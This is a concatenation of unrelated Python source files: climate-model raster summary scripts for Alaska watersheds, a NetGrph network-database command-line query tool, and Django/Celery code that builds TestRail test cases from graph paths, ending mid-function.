		gdf = gpd.read_file( self.subdomains_fn )
		id_groups = gdf.groupby( self.id_field ) # iterator of tuples (id, gdf slice)

		out_shape = self.rasterio_raster.height, self.rasterio_raster.width
		out_transform = self.rasterio_raster.affine

		arr_list = [ self._rasterize_id( df, value, out_shape, out_transform, background_value=self.background_value ) for value, df in id_groups ]
		self.sub_domains = arr_list
	@staticmethod
	def _rasterize_id( df, value, out_shape, out_transform, background_value=0 ):
		from rasterio.features import rasterize
		geom = df.geometry
		out = rasterize( ( ( g, value ) for g in geom ),
							out_shape=out_shape,
							transform=out_transform,
							fill=background_value )
		return out
	def _get_subdomains_dict( self ):
		import geopandas as gpd
		gdf = gpd.read_file( self.subdomains_fn )
		self.names_dict = dict( zip( gdf[self.id_field], gdf[self.name_field] ) )

def diff( x, y, *args, **kwargs ):
	'''
	difference between 2 np.arrays representing 
	2-D rasters in the format : GeoTiff

	ARGUMENTS:
	----------
	x = [str] path to the baseline GeoTiff
	y = [str] path to the modeled GeoTiff

	RETURNS:
	-------
	difference of the 2 arrays as a 2D numpy array
	( y - x )
	
	'''
	import rasterio
	baseline = rasterio.open( x ).read( 1 )
	modeled = rasterio.open( y ).read( 1 )
	return ( modeled - baseline  )

def wrap_diff( x ):
	''' simple wrapper for multiprocessing '''
	return diff( *x )

def get_metrics( base_path, variable, model, scenario, decade, mask, domain_name=None, ncpus=32 ):
	'''
	main function to return monthly summary stats for the group
	as a `dict`
	'''
	decade_begin, decade_end = decade
	modeled_files = glob.glob( os.path.join( base_path, model, scenario, variable, '*.tif' ) )
	modeled_files = sort_files( only_years( modeled_files, begin=decade_begin, end=decade_end, split_on='_', elem_year=-1 ) )
	
	# groupby month here
	month_grouped = pd.Series( modeled_files ).groupby([ os.path.basename(i).split('_')[-2] for i in modeled_files ])
	month_grouped = { i:j.tolist() for i,j in month_grouped } # make a dict
	
	month_dict = {}
	for month in month_grouped:
		modeled = month_grouped[ month ]
		# change the model name to the baseline model in the series for comparison
		baseline = [ fn.replace( model, '5ModelAvg' ) for fn in modeled ]
		args = zip( baseline, modeled )

		# get diffs in parallel
		pool = mp.Pool( ncpus )
		arr = np.array( pool.map( wrap_diff, args ) )
		pool.close()
		pool.join()
		pool.terminate()
		pool = None

		# this derives a mean from 3D (time, x, y) to 2D (x, y)
		mean_arr = np.mean( arr, axis=0 )
		arr = None
		masked = np.ma.masked_array( mean_arr, mask == 0 )

		# calculate metrics across the 2D space
		month_dict[ str(month) ] = { 'stdev':str( np.std( masked ) ),
									'mean':str( np.mean( masked ) ),
									'min':str( np.min( masked ) ),
									'max':str( np.max( masked ) ) }

		# domain_name
		if domain_name == None:
			domain_name, = str( np.unique( mask > 0 ) )
	
	return { '_'.join([ model, scenario, variable, domain_name, str(decade_begin), str(decade_end) ]) : month_dict }

if __name__ == '__main__':
	import os, glob, itertools, rasterio, json
	from copy import deepcopy
	import xarray as xr
	import numpy as np
	import pandas as pd
	from pathos import multiprocessing as mp

	# setup args
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/grids'
	output_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/tabular'
	ncpus = 32
	project = 'cmip5'
	variables = [ 'tasmin', 'tasmax', 'tas', 'pr' ]
	models = [ 'IPSL-CM5A-LR', 'MRI-CGCM3', 'GISS-E2-R', 'GFDL-CM3', 'NCAR-CCSM4' ]
	scenarios = [ 'historical', 'rcp26', 'rcp45', 'rcp60', 'rcp85' ]
	template_rst = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled/NCAR-CCSM4/historical/tasmax/tasmax_mean_C_ar5_NCAR-CCSM4_historical_01_1901.tif'
	rst = rasterio.open( template_rst )
	# subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/Kenai_StudyArea.shp'
	subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/SCTC_watersheds.shp'
	
	# create the rasterized version of the input shapefile for spatial query
	# subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='OBJECTID', background_value=0 )
	subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='HU_12_Name', background_value=0 )
	masks = subdomains.sub_domains

	# make sure no NoData pixels are in the domain
	nodata_mask = rst.read_masks( 1 ) # mask where zero
	for count, mask in enumerate( masks ):
		mask[ nodata_mask == 0 ] = 0
		masks[ count ] = mask

	for variable in variables:
		print( variable )
		all_data = {}
		for model, scenario in itertools.product( models, scenarios ):
			if scenario == 'historical':
				decades = [(1900,1909),(1910, 1919),(1920, 1929),(1930, 1939),(1940, 1949),\
							(1950, 1959),(1960, 1969),(1970, 1979),(1980, 1989),(1990, 1999),(2000,2005)]
			else:
				decades = [(2006,2009),(2010, 2019),(2020, 2029),(2030, 2039),(2040, 2049),(2050, 2059),\
							(2060, 2069),(2070, 2079),(2080, 2089),(2090, 2099)]

			for decade in decades:
				if scenario == 'historical':
					begin = 1900
					end = 2005
				else:
					begin = 2006
					end = 2100
			
				print( 'running: {} {} {} {}'.format( model, variable, scenario, decade ) )

				for mask in masks:
					domain_num, = np.unique(mask[mask > 0])
					domain_name = subdomains.names_dict[ domain_num ].replace( ' ', '' )
					# run it

					all_data.update( get_metrics( base_path, variable, model, scenario, decade, mask, domain_name, ncpus ) )
		
		# write it out to disk
		if not os.path.exists( output_path ):
			os.makedirs( output_path )
		
		prefix = '_'.join([ variable, project, 'decadals', '5ModelAvg_diff','summaries', str(1900), str(2100) ])

		# its LONG FORMAT output with all datas in rows for a single var/metric
		output_filename = os.path.join( output_path, prefix + '.json' )
		with open( output_filename, 'w' ) as out_json:
			json.dump( all_data, out_json )

		# now some panel-y stuff with the output JSON
		panel = pd.Panel( deepcopy( all_data ) ).copy()
		metrics = ['mean','max','min','stdev']
		for metric in metrics:
			df = panel[ :, metric, : ].T
			# sort the months
			df = df[ [ '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12' ] ]
			output_filename = os.path.join( output_path, prefix + '_' + metric +'.csv' )
			if variable == 'pr':
				df = df.astype( np.float ).round( 0 ).astype( np.int )
				# output to csv -- int so no rounding needed.
				df.to_csv( output_filename, sep=',')
			else:
				df = df.astype( np.float32 )
				# round tas* to single decimal place
				df = df.copy().round( decimals=1 )
				# output ensuring single decimal place as string
				df.apply( lambda x: x.apply( lambda x: '%2.1f' % x) ).to_csv( output_filename, sep=',', float_format='%11.6f')

# maybe read in the baseline
# then loop through reads of all models...
# perform the diff
# then groupby month and compute means / stdev

def sort_files( files, split_on='_', elem_month=-2, elem_year=-1 ):
	'''
	sort a list of files properly using the month and year parsed
	from the filename.  This is useful with SNAP data since the standard
	is to name files like '<prefix>_MM_YYYY.tif'.  If sorted using base
	Pythons sort/sorted functions, things will be sorted by the first char
	of the month, which makes thing go 1, 11, ... which sucks for timeseries
	this sorts it properly following SNAP standards as the default settings.

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_month = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-2. For SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sorted `list` by month and year ascending. 

	'''
	import pandas as pd
	months = [ int(fn.split('.')[0].split( split_on )[elem_month]) for fn in files ]
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( {'fn':files, 'month':months, 'year':years} )
	df_sorted = df.sort_values( ['year', 'month' ] )
	return df_sorted.fn.tolist()

def only_years( files, begin=1901, end=2100, split_on='_', elem_year=-1 ):
	'''
	return new list of filenames where they are truncated to begin:end

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	begin = [int] four digit integer year of the begin time default:1901
	end = [int] four digit integer year of the end time default:2100
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sliced `list` to begin and end year.
	'''
	import pandas as pd
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( { 'fn':files, 'year':years } )
	df_slice = df[ (df.year >= begin ) & (df.year <= end ) ]
	return df_slice.fn.tolist()

class SubDomains( object ):
	'''
	rasterize subdomains shapefile to ALFRESCO AOI of output set
	'''
	def __init__( self, subdomains_fn, rasterio_raster, id_field, name_field, background_value=0, *args, **kwargs ):
		'''
		initializer for the SubDomains object
		The real magic here is that it will use a generator to loop through the 
		unique ID's in the sub_domains raster map generated.
		'''
		import numpy as np
		self.subdomains_fn = subdomains_fn
		self.rasterio_raster = rasterio_raster
		self.id_field = id_field
		self.name_field = name_field
		self.background_value = background_value
		self._rasterize_subdomains( )
		self._get_subdomains_dict( )

	def _rasterize_subdomains( self ):
		'''
		rasterize a subdomains shapefile to the extent and resolution of 
		a template raster file. The two must be in the same reference system 
		or there will be potential issues. 
		returns:
			numpy.ndarray with the shape of the input raster and the shapefile
			polygons burned in with the values of the id_field of the shapefile
		gotchas:
			currently the only supported data type is uint8 and all float values will be
			coerced to integer for this purpose.  Another issue is that if there is a value
			greater than 255, there could be some error-type issues.  This is something that 
			the user needs to know for the time-being and will be fixed in subsequent versions
			of rasterio.  Then I can add the needed changes here.
		'''
		import geopandas as gpd
		import numpy as np

		gdf = gpd.read_file( self.subdomains_fn )
		id_groups = gdf.groupby( self.id_field ) # iterator of tuples (id, gdf slice)

		out_shape = self.rasterio_raster.height, self.rasterio_raster.width
		out_transform = self.rasterio_raster.affine

		arr_list = [ self._rasterize_id( df, value, out_shape, out_transform, background_value=self.background_value ) for value, df in id_groups ]
		self.sub_domains = arr_list
	@staticmethod
	def _rasterize_id( df, value, out_shape, out_transform, background_value=0 ):
		from rasterio.features import rasterize
		geom = df.geometry
		out = rasterize( ( ( g, value ) for g in geom ),
							out_shape=out_shape,
							transform=out_transform,
							fill=background_value )
		return out
	def _get_subdomains_dict( self ):
		import geopandas as gpd
		gdf = gpd.read_file( self.subdomains_fn )
		self.names_dict = dict( zip( gdf[self.id_field], gdf[self.name_field] ) )

def f( x ):
	''' apply function for multiprocessing.pool 
		helps with clean i/o '''
	with rasterio.open( x ) as rst:
		arr = rst.read( 1 )
	return arr

def get_metrics( base_path, variable, model, scenario, decade, mask, domain_name=None, ncpus=32 ):
	'''
	main function to return monthly summary stats for the group
	as a `dict`
	'''
	decade_begin, decade_end = decade
	modeled_files = glob.glob( os.path.join( base_path, model, scenario, variable, '*.tif' ) )
	modeled_files = sort_files( only_years( modeled_files, begin=decade_begin, end=decade_end, split_on='_', elem_year=-1 ) )
	
	# groupby month here
	month_grouped = pd.Series( modeled_files ).groupby([ os.path.basename(i).split('_')[-2] for i in modeled_files ])
	month_grouped = { i:j.tolist() for i,j in month_grouped } # make a dict
	
	month_dict = {}
	for month in month_grouped:
		# get diffs in parallel
		pool = mp.Pool( ncpus )
		arr = np.array( pool.map( f, month_grouped[ month ] ) )
		pool.close()
		pool.join()
		pool.terminate()
		pool = None

		# this derives a mean from 3D (time, x, y) to 2D (x, y)
		mean_arr = np.mean( arr, axis=0 )
		arr = None
		masked = np.ma.masked_array( mean_arr, mask == 0 )

		# calculate metrics across the 2D space
		month_dict[ str(month) ] = { 'stdev':str( np.std( masked ) ),
									'mean':str( np.mean( masked ) ),
									'min':str( np.min( masked ) ),
									'max':str( np.max( masked ) ) }

		# domain_name
		if domain_name == None:
			domain_name, = str( np.unique( mask > 0 ) )
	
	return { '_'.join([ model, scenario, variable, domain_name, str(decade_begin), str(decade_end) ]) : month_dict }


if __name__ == '__main__':
	import os, glob, itertools, rasterio, json
	from copy import deepcopy
	import xarray as xr
	import numpy as np
	import pandas as pd
	from pathos import multiprocessing as mp

	# setup args
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/grids'
	output_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/tabular'
	ncpus = 32
	project = 'cru'
	variables = [ 'tasmin', 'tasmax', 'tas', 'pr' ]
	models = [ 'ts323' ]
	scenarios = [ 'historical' ]
	begin_out = 1901
	end_out = 2014
	template_rst = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled/NCAR-CCSM4/historical/tasmax/tasmax_mean_C_ar5_NCAR-CCSM4_historical_01_1901.tif'
	rst = rasterio.open( template_rst )
	# subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/Kenai_StudyArea.shp'
	subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/SCTC_watersheds.shp'

	# create the rasterized version of the input shapefile for spatial query
	# subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='OBJECTID', background_value=0 )
	subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='HU_12_Name', background_value=0 )
	masks = subdomains.sub_domains

	# make sure no NoData pixels are in the domain
	nodata_mask = rst.read_masks( 1 ) # mask where zero
	for count, mask in enumerate( masks ):
		mask[ nodata_mask == 0 ] = 0
		masks[ count ] = mask

	for variable in variables:
		all_data = {}
		for model, scenario in itertools.product( models, scenarios ):
			if scenario == 'historical':
				decades = [(1900,1909),(1910, 1919),(1920, 1929),(1930, 1939),(1940, 1949),\
							(1950, 1959),(1960, 1969),(1970, 1979),(1980, 1989),(1990, 1999),(2000,2009),(2010, 2014)]
				begin = 1901
				end = 2014
			else:
				decades = [(2006,2009),(2010, 2019),(2020, 2029),(2030, 2039),(2040, 2049),(2050, 2059),\
							(2060, 2069),(2070, 2079),(2080, 2089),(2090, 2099)]
				begin = 2006
				end = 2100

			for decade in decades:
				print( 'running: {} {} {} {}'.format( model, variable, scenario, decade ) )
				for mask in masks:
					domain_num, = np.unique(mask[mask > 0])
					domain_name = subdomains.names_dict[ domain_num ].replace( ' ', '' )
					# run it
					all_data.update( get_metrics( base_path, variable, model, scenario, decade, mask, domain_name, ncpus ) )

		# write it out to disk
		if not os.path.exists( output_path ):
			os.makedirs( output_path )
		
		prefix = '_'.join([ variable, project, 'decadal', 'summaries', str(begin_out), str(end_out) ])

		# its LONG FORMAT output with all datas in rows for a single var/metric
		output_filename = os.path.join( output_path, prefix + '.json' )
		with open( output_filename, 'w' ) as out_json:
			json.dump( all_data, out_json )

		# now some panel-y stuff with the output JSON
		panel = pd.Panel( deepcopy( all_data ) ).copy()
		metrics = ['mean','max','min','stdev']
		for metric in metrics:
			df = panel[ :, metric, : ].T
			# sort the months
			df = df[ [ '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12' ] ]
			output_filename = os.path.join( output_path, prefix + '_' + metric +'.csv' )
			if variable == 'pr':
				df = df.astype( np.float ).round( 0 ).astype( np.int )
				# output to csv -- int so no rounding needed.
				df.to_csv( output_filename, sep=',')
			else:
				df = df.astype( np.float32 )
				# round tas* to single decimal place
				df = df.copy().round( decimals=1 )
				# output ensuring single decimal place as string
				df.apply( lambda x: x.apply( lambda x: '%2.1f' % x) ).to_csv( output_filename, sep=',', float_format='%11.6f')

#!/usr/bin/env python3
#
# NetGrph Database CLI Query Tool
#
# Copyright (c) 2016 "Jonathan Yantis"
#
# This file is a part of NetGrph.
#
#    This program is free software: you can redistribute it and/or  modify
#    it under the terms of the GNU Affero General Public License, version 3,
#    as published by the Free Software Foundation.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    As a special exception, the copyright holders give permission to link the
#    code of portions of this program with the OpenSSL library under certain
#    conditions as described in each individual source file and distribute
#    linked combinations including the program with the OpenSSL library. You
#    must comply with the GNU Affero General Public License in all respects
#    for all of the code used other than as permitted herein. If you modify
#    file(s) with this exception, you may extend this exception to your
#    version of the file(s), but you are not obligated to do so. If you do not
#    wish to do so, delete this exception statement from your version. If you
#    delete this exception statement from all source files in the program,
#    then also delete it in the license file.
#
#
"""netgrph is the primary CLI query too for NetGrph
   Also see ngreport
"""
import os
import re
import argparse
import nglib
import nglib.query


# Default Config File Location
config_file = '/etc/netgrph.ini'
alt_config = './docs/netgrph.ini'

# Test/Dev Config
dirname = os.path.dirname(os.path.realpath(__file__))
if re.search(r'\/dev$', dirname):
    config_file = 'netgrphdev.ini'
elif re.search(r'\/test$', dirname):
    config_file = "netgrphdev.ini"

parser = argparse.ArgumentParser()

parser = argparse.ArgumentParser(prog='netgrph',
                                 description='Query the NetGrph Database',
                                 epilog="""
                                 Examples:
                                 netgrph 10.1.1.1 (Free Search for IP),
                                 netgrph -net 10.1.1.0/24 (Search for CIDR),
                                 netgrph -group MDC (VLAN Database Search),
                                 netgrph -fp 10.1.1.1 10.2.2.1 (Firewall Path Search)
                                 """)

parser.add_argument("search", help="Search the NetGrph Database (Wildcard Default)",
                    type=str)
parser.add_argument("-ip", help="Network Details for an IP",
                    action="store_true")
parser.add_argument("-net", help="All networks within a CIDR (eg. 10.0.0.0/8)",
                    action="store_true")
parser.add_argument("-nlist", help="Get all networks in an alert group",
                    action="store_true")
parser.add_argument("-nfilter", help="Get all networks on a filter (see netgrph.ini)",
                    action="store_true")
parser.add_argument("-dev", help="Get the Details for a Device (Switch/Router/FW)",
                    action="store_true")
parser.add_argument("-path", metavar="src",
                    help="Full Path Between -p src dst (ip/cidr, requires NetDB)",                    
                    type=str)
parser.add_argument("-fpath", metavar="src",
                    help="Security Path between -fp src dst",
                    type=str)
parser.add_argument("-rpath", metavar="src",
                    help="Routed Path between -rp IP/CIDR1 IP/CIDR2 ",
                    type=str)
parser.add_argument("-spath", metavar="src",
                    help="Switched Path between -sp sw1 sw2 (Neo4j Regex)",
                    type=str)
parser.add_argument("-group", help="Get VLANs for a Management Group",
                    action="store_true")
parser.add_argument("-vrange", metavar='1[-4096]', help="VLAN Range (default 1-1999)",
                    type=str)
parser.add_argument("-vid", help="VLAN ID Search", action="store_true")
parser.add_argument("-vtree", help="Get the VLAN Tree for a VNAME",
                    action="store_true")
parser.add_argument("-output", metavar='TREE',
                    help="Return Format: TREE, TABLE, CSV, JSON, YAML", type=str)
parser.add_argument("--days", metavar='int', help="Days in Past (NetDB Specific)", type=int)
parser.add_argument("--conf", metavar='file', help="Alternate Config File", type=str)
parser.add_argument("--debug", help="Set debugging level", type=int)
parser.add_argument("--verbose", help="Verbose Output", action="store_true")

args = parser.parse_args()

# Alternate Config File
if args.conf:
    config_file = args.conf

# Test configuration exists
if not os.path.exists(config_file):
    if not os.path.exists(alt_config):
        raise Exception("Configuration File not found", config_file)
    else:
        config_file = alt_config

verbose = 0
if args.verbose:
    verbose = 1
if args.debug:
    verbose = args.debug

# 7 day default for NetDB
if not args.days:
    args.days = 7

# Default VLAN Range
if not args.vrange:
    args.vrange = "1-1999"
if args.output:
    args.output = args.output.upper()

# Setup Globals for Debugging
nglib.verbose = verbose

# Initialize Library
nglib.init_nglib(config_file)

if args.fpath:
    nglib.query.path.get_fw_path(args.fpath, args.search)

elif args.spath:
    rtype = "TREE"
    if args.output:
        rtype = args.output
    nglib.query.path.get_switched_path(args.spath, args.search, rtype=rtype)                    

elif args.rpath:
    rtype = "TREE"
    if args.output:
        rtype = args.output
    nglib.query.path.get_routed_path(args.rpath, args.search, rtype=rtype)                    
elif args.path:
    rtype = "TREE"
    if args.output:
        rtype = args.output
    nglib.query.path.get_full_path(args.path, args.search, rtype=rtype)                    

elif args.dev:
    rtype = "TREE"
    if args.output:
        rtype = args.output
    nglib.query.dev.get_device(args.search, rtype=rtype, vrange=args.vrange)

elif args.ip:
    rtype = "TREE"
    if args.output:
        rtype = args.output

    nglib.query.net.get_net(args.search, rtype=rtype, days=args.days)

elif args.net:
    rtype = "CSV"
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_cidr(args.search, rtype=rtype)

elif args.nlist:
    rtype = "CSV"
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_filter(args.search, rtype=rtype)

elif args.nfilter:
    rtype = "CSV"
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_filter(nFilter=args.search, rtype=rtype)

elif args.group:
    nglib.query.vlan.get_vlans_on_group(args.search, args.vrange)

elif args.vtree:
    rtype = "TREE"
    if args.output:
        rtype = args.output
    nglib.query.vlan.get_vtree(args.search, rtype=rtype)

elif args.vid:
    rtype = "TREE"
    if args.output:
        rtype = args.output
    nglib.query.vlan.search_vlan_id(args.search, rtype=rtype)

# Universal Search
elif args.search:

    # Try VLAN ID First
    # try:
    #     #vid = int(args.search)
    #
    #     if vid >= 0 and vid <= 4096:
    #         rtype = "TREE"
    #         if args.output: rtype = args.output
    #         nglib.query.searchVLANID(args.search,rtype=rtype)
    # except:
    vid = re.search(r'^(\d+)$', args.search)
    vname = re.search(r'^(\w+\-\d+)$', args.search)
    ip = re.search(r'^(\d+\.\d+\.\d+\.\d+)$', args.search)
    net = re.search(r'^(\d+\.\d+\.\d+\.\d+\/\d+)$', args.search)
    text = re.search(r'^(\w+)$', args.search)

    if vid:
        try:
            if int(args.search) >= 0 and int(args.search) <= 4096:
                rtype = "TREE"
                if args.output:
                    rtype = args.output
                nglib.query.vlan.search_vlan_id(args.search, rtype=rtype)
        except:
            pass
    elif vname:
        rtype = "TREE"
        if args.output:
            rtype = args.output
        nglib.query.vlan.get_vtree(args.search, rtype=rtype)
    elif net:
        rtype = "CSV"
        if args.output:
            rtype = args.output
        nglib.query.net.get_networks_on_cidr(args.search, rtype=rtype)
    elif ip:
        rtype = "TREE"
        if args.output:
            rtype = args.output
        nglib.query.net.get_net(args.search, rtype=rtype, days=args.days)
    elif text:
        rtype = "TREE"
        if args.output:
            rtype = args.output
        nglib.query.universal_text_search(args.search, args.vrange, rtype=rtype)
    else:
        print("Unknown Search:", args.search)

else:
    parser.print_help()
    print()


from testrail import APIClient
from mdta.apps.graphs.models import Node, Edge
from mdta.apps.projects.models import Project, TestRailConfiguration

START_NODE_NAME = 'Start'


def context_testcases():
    """
    Retrieve context for tab TestCases
    :return:
    """
    context = {
        'projects': Project.objects.all(),
        'testrails': TestRailConfiguration.objects.all(),
    }

    return context


def get_projects_from_testrail(instance):
    client = APIClient(instance.host)
    client.user = instance.username
    client.password = instance.password

    return client.send_get('get_projects')


def create_routing_test_suite(project=None, modules=None):
    """
    Create routing paths for project.modules lists or module lists
    :param project:
    :param modules:
    :return:
    """
    data = []

    if project:
        data = create_routing_test_suite_module(project.modules)
    elif modules:
        data = create_routing_test_suite_module(modules)

    return data


def create_routing_test_suite_module(modules):
    """
    Create routing paths for list of modules
    :param modules:
    :return:
    """
    test_suites = []

    for module in modules:
        data = get_paths_through_all_edges(module.edges_all)

        test_suites.append({
            'module': module.name,
            'data': data
        })                    

    return test_suites


def get_paths_through_all_edges(edges):
    """
    Get all paths through all edges
    :param edges:
    :param data:
    :return:
    """
    data = []
    for edge in edges:
        # print(edge.id)
        path = routing_path_to_edge(edge)
        if path:
            tcs = []
            pre_condition = []
            # for index, step in enumerate(path, start=1):
            for step in path:                    
                if isinstance(step, Node):                    
                    traverse_node(step, tcs)                    
                if isinstance(step, Edge):                    
                    if step.type.name == 'PreCondition':                    
                        update_testcase_precondition(step, pre_condition)                    
                    traverse_edge(step, tcs)                    

            data.append({                    
                'pre_condition': pre_condition,                    
                'tc_steps': tcs                    
            })                    
    # return check_subpath_in_all(data)
    return data


def routing_path_to_edge(edge):
    """
    Routing path to current Edge, edge.from_node
    :param edge:
    :return:
    """
    visited_nodes = [edge.to_node]  # Visited nodes for the path to this Edge

    data = []

    routing_path_to_node(edge.from_node, data, visited_nodes)

    if data:
        data.append(edge)
        data.append(edge.to_node)

    # print(data)
    return data


def routing_path_to_node(node, data, visited_nodes):
    """
    Routing path to current Node
    :param node:
    :param data:
    :return:
    """
    path = []
    visited_nodes.append(node)

    breadth_first_search(node, path, visited_nodes)

    data += path


def breadth_first_search(node, path, visited_nodes):
    """
    Search a path from Start node(type='Start') to current Node
    Breadth
    :param node:
    :return:
    """

    start_node_found_outside = False  # flag to find Start Node outside

    if node.type.name == START_NODE_NAME:
        path.append(node)
    else:
        # edges = Edge.objects.filter(to_node=node)
        edges = node.arriving_edges
        if edges.count() > 0:
            start_node_found = False  # flag to find Start Node in current search
            for edge in edges:
                if edge.from_node not in visited_nodes or edge.from_node.type.name == START_NODE_NAME:  # if Node is not visited or Node is Start
                    if edge.from_node != edge.to_node:
                        if edge.from_node.type.name != START_NODE_NAME:
                            if edge.from_node.arriving_edges.count() > 0:
                                start_node_found_outside = search_start_node_outside(edge.from_node)                    
                                breadth_first_search(edge.from_node, path, visited_nodes)
                        else:
                            start_node_found = True
                            path.append(edge.from_node)

                        if start_node_found or start_node_found_outside:  # if found Start Node, add Edge
                            path.append(edge)
                            path.append(node)

                    if start_node_found:  # if found Start Node, break out of for loop                    
                        break                    
            if not start_node_found:  # if Not found Start Node, variable Path=[]
                path = []
        else:  # if No Arriving Edges, variable Path=[]
            path = []

    if start_node_found_outside:
        path.append(node)

    # print('path: ', node.name,  path)


def check_subpath_in_all(all_path):
    """
    Find sub paths contained by parent path in all possible paths and remove them
    Use set(a) < set(b) to compare if list_b contains list_a
    :param all_path:
    :return:
    """
    data = []
    length = len(all_path)
    for i in range(length):
        for j in range(i + 1, length):
            if set(all_path[i]) < set(all_path[j]) and not check_path_contains_in_result(all_path[j], data):
                data.append(all_path[j])
            elif set(all_path[i]) > set(all_path[j]) and not check_path_contains_in_result(all_path[i], data):
                data.append(all_path[i])

    # check if first path of all_path is in result
    if length > 0 and not check_path_contains_in_result(all_path[0], data):
        data.append(all_path[0])

    return data


def check_path_contains_in_result(path, result):
    """
    Check current path is covered in result
    :param path:
    :param result:
    :return:
    """
    flag = False                    
    for i in range(len(result)):
        if set(path) <= set(result[i]):
            flag = True                    
            break                    
        else:
            continue

    return flag                    


def traverse_node(node, tcs):
    """
    Traverse Node based on node type
    :param step:                    
    :param tcs:
    :return:
    """
    if node.type.name == START_NODE_NAME:
        add_step(node_start(node), tcs)
    elif node.type.name in ['Menu Prompt', 'Menu Prompt with Confirmation', 'Play Prompt']:
        add_step(node_prompt(node), tcs)
    else:
        add_step(node_check_holly_log(node), tcs)


def node_start(node):
    return {
        'content': get_item_properties(node),
    }


def node_prompt(node):
    return {
        'content': 'Node - ' + node.name,
        'expected': node.properties['Verbiage']
    }


def node_check_holly_log(node):
    return {
        'content': 'Node - ' + node.name
    }


def traverse_edge(edge, tcs):
    """
    Traverse Edge based on edge type
    :param edge:
    :param tcs:
    :return:
    """
    if edge.type.name == 'DTMF':
        add_step(edge_dtmf_dial(edge), tcs)
    elif edge.type.name == 'Speech':
        add_step(edge_speech_say(edge), tcs)
    elif edge.type.name == 'Data':
        add_step(edge_alter_data_requirement(edge), tcs)
    elif edge.type.name == 'PreCondition':
        add_step(edge_precondition(edge), tcs)


def add_step(step, tcs):
    """
    Add step to test cases
    :param step:                    
    :param tcs:
    :return:
    """
    tcs.append({
        'content': step['content'],
        'expected': step['expected'] if 'expected' in step.keys() else ''
    })                    


def edge_dtmf_dial(edge):
    return {
        'content': 'DTMF Dial - ' + get_item_properties(edge)
    }


def edge_speech_say(edge):
    return {
        'content': 'Speech Say - ' + get_item_properties(edge)
    }


def edge_alter_data_requirement(edge):
    return {
        'content': 'Alter Data Requirement - ' + get_item_properties(edge)
    }


def edge_precondition(edge):
    return {
        'content': 'PreCondition - ' + get_item_properties(edge)
    }


def get_item_properties(item):
    data = ''
    for key in item.properties:
        data += key + ': ' + item.properties[key] + ', '

    return data


def update_testcase_precondition(edge, pre_condition):
    data = []
    for key in edge.properties:
        data.append(key + ': ' + edge.properties[key])

    pre_condition.append(data)


def search_start_node_outside(node):                    
    flag = False                    
    if node.arriving_edges.count() > 0:                    
        for edge in node.arriving_edges:                    
            if edge.from_node.type.name == START_NODE_NAME:                    
                flag = True                    
                break                    

    return flag                    


from datetime import datetime
from django.core.exceptions import ValidationError
from django.shortcuts import get_object_or_404

from mdta.celery_module import app
from mdta.apps.projects.models import Project
from mdta.apps.testcases.models import TestCaseResults
from mdta.apps.testcases.utils import create_routing_test_suite, add_testsuite_to_project, remove_section_from_testsuite, \
    add_section_to_testsuite, add_testcase_to_section
from mdta.apps.testcases.testrail import APIClient


@app.task
def create_testcases_celery(project_id, call_from=None):                    
    """
    Create TestCases per project/module
    :param request:
    :param project_id:
    :return:
    """

    project = get_object_or_404(Project, pk=project_id)
    testcases = create_routing_test_suite(project=project)

    tc_results = TestCaseResults.objects.filter(project=project)
    if tc_results.count() > 2:
        tc_latest = project.testcaseresults_set.latest('updated')
        if tc_latest.results == testcases:
            tc_latest.updated = datetime.now()
            tc_latest.save()
        else:
            tc_earliest = project.testcaseresults_set.earliest('updated')
            tc_earliest.results = testcases
            tc_earliest.updated = datetime.now()
            tc_earliest.save()
    else:
        try:
            TestCaseResults.objects.create(
                project=project,
                results=testcases
            )
        except (ValueError, ValidationError) as e:
            print(str(e))

    msg = 'TestCases updated.'                    
    if not call_from:                    
